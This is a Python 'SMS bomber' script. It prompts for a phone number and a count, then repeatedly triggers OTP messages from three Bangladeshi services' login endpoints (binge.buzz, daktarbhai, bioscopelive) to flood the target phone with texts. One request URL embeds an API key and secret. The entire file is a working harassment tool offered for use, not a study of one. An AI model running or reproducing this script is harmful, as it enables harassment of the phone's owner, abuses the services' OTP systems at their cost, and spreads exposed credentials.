# coding=utf-8
import requests
from requests.structures import CaseInsensitiveDict
import os 
import time 
from time import sleep 

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
W = '\033[1;37m'

os.system("python2 logo.py")

number=str(input(C + "Enter Your Number:"+ Y +" "))
print("")
sleep(1)
print(Y + "Note:3 times as much as you give.For example:10 × 3 = 30.If you give 10 massage 30 will send the message.")
print("")
sleep(1)
amount=int(input(C + "Enter Amount:"+ Y + " "))
#1 

binge1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number

#2 

url = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"
headers2["Content-Length"] = "0"

#3 
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"


print(G + "SMS Sending...")
sleep(1)
for j in range(amount):
    resp = requests.post(binge1, headers=headers1, data=data1)
    sleep(1)
    resp1 = requests.post(url, headers=headers2)
    sleep(1)
    requests.get(api)
        
    print("")
    print(G + "[✓] "+str(j+1)+" SMS Sent Successful...")
